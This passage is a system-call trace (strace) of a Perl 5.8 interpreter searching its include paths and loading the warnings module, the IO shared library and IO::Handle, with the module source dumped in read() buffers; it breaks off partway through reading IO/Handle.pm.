5498  07:09:19.806211 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806224 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806238 stat64("/usr/lib/perl5/warnings.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806249 stat64("/usr/lib/perl5/warnings.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806262 stat64("/usr/share/perl5/warnings.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806274 stat64("/usr/share/perl5/warnings.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806287 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806303 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbf9c217c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806317 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbf9c226c) = -1 ENOENT (No such file or directory)
5498  07:09:19.806329 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
5498  07:09:19.806350 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 11
5498  07:09:19.806364 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c1f88) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.806375 _llseek(11, 0, [0], SEEK_CUR) = 0
5498  07:09:19.806393 read(11, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
5498  07:09:19.806807 brk(0x81b6000)    = 0x81b6000
5498  07:09:19.806824 brk(0x81b5000)    = 0x81b5000
5498  07:09:19.806900 read(11, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
5498  07:09:19.807377 read(11, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
5498  07:09:19.807885 read(11, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
5498  07:09:19.808013 read(11, "", 4096) = 0
5498  07:09:19.808030 close(11)         = 0
5498  07:09:19.808253 _llseek(10, 412, [412], SEEK_SET) = 0
5498  07:09:19.808269 _llseek(10, 0, [412], SEEK_CUR) = 0
5498  07:09:19.808280 close(10)         = 0
5498  07:09:19.808325 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5498  07:09:19.808348 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5498  07:09:19.808376 futex(0xb7f70070, 0x81 /* FUTEX_??? */, 2147483647) = 0
5498  07:09:19.808391 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 10
5498  07:09:19.808405 read(10, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5498  07:09:19.808492 fstat64(10, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5498  07:09:19.808517 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 10, 0) = 0xb7f74000
5498  07:09:19.808530 mmap2(0xb7f78000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 10, 0x3) = 0xb7f78000
5498  07:09:19.808544 close(10)         = 0
5498  07:09:19.808744 stat64("/etc/perl/IO/Handle.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808761 stat64("/etc/perl/IO/Handle.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808775 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808788 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808802 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808814 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808828 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808840 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808853 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808865 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf9c262c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808878 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf9c271c) = -1 ENOENT (No such file or directory)
5498  07:09:19.808890 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
5498  07:09:19.808911 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 10
5498  07:09:19.808925 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9c2438) = -1 ENOTTY (Inappropriate ioctl for device)
5498  07:09:19.808936 _llseek(10, 0, [0], SEEK_CUR) = 0
5498  07:09:19.808952 read(10, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      